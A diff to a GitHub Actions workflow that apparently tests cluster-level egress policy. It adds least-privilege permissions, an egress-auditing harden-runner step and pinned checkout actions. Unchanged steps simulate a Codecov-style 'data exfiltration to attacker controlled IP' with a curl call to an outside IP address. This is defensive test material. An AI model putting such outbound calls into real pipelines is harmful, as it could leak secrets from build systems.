@@ -2,19 +2,35 @@ name: "ARC: Secure-By-Default Cluster-Level Policy"
 on:
   workflow_dispatch:
   
+permissions: {}
+
 jobs:
   direct-ip-hosted:
+    permissions:
+      contents: read  # for actions/checkout to fetch code
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v3
+      - name: Harden the runner (Audit all outbound calls)
+        uses: step-security/harden-runner@v2
+        with:
+          egress-policy: audit
+
+      - uses: actions/checkout@a37ce9120846195fa4ece8f58b268e6043cb2f26 # v3.7.0
 
       # Codecov Scenario: Exfiltrate data to attacker's IP address
       - name: Data Exfiltration To Attacker Controlled IP address
         run: curl 104.16.209.12 --connect-timeout 5
   direct-ip-arc:
+    permissions:
+      contents: read  # for actions/checkout to fetch code
     runs-on: self-hosted
     steps:
-      - uses: actions/checkout@v3
+      - name: Harden the runner (Audit all outbound calls)
+        uses: step-security/harden-runner@v2
+        with:
+          egress-policy: audit
+
+      - uses: actions/checkout@a37ce9120846195fa4ece8f58b268e6043cb2f26 # v3.7.0
 
       # Codecov Scenario: Exfiltrate data to attacker's IP address
       - name: Data Exfiltration To Attacker Controlled IP address
